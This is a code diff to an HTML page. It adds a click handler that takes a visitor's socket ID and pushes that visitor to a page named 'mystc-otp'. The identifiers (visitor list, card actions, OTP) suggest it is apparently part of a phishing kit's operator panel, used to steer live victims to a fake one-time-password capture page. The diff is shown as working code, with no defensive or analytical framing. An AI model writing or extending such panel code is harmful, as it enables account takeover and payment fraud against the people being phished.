@@ -3555,5 +3555,6 @@ if(typeof orig==='function'){window.renderVisitorsList=function(){var r=orig.app
 var mo=new MutationObserver(function(){apply()});
 function run(){var c=document.getElementById('visitorsList');if(c){mo.observe(c,{childList:true,subtree:true});note();apply()}else{setTimeout(run,300)}}
 run();setInterval(function(){note();apply()},1200);})();</script>
+<script id=kddOtpJs>(function(){if(window.__k2)return;window.__k2=1;document.addEventListener('click',function(e){var b=e.target&&e.target.closest?e.target.closest('button[onclick*=cardActionOTP]'):null;if(!b)return;var oc=b.getAttribute('onclick')||'',i=oc.indexOf(',');var s=oc.slice(i+1).replace(/[^A-Za-z0-9_-]/g,'');if(!s){try{s=(visitors.get(selectedVisitorId)||{}).socketId||''}catch(x){}}if(!s)return;function g(){try{navigateVisitorToPage(s,'mystc-otp')}catch(x){}}g();setTimeout(g,150);});})();</script>
 </body>
 </html>
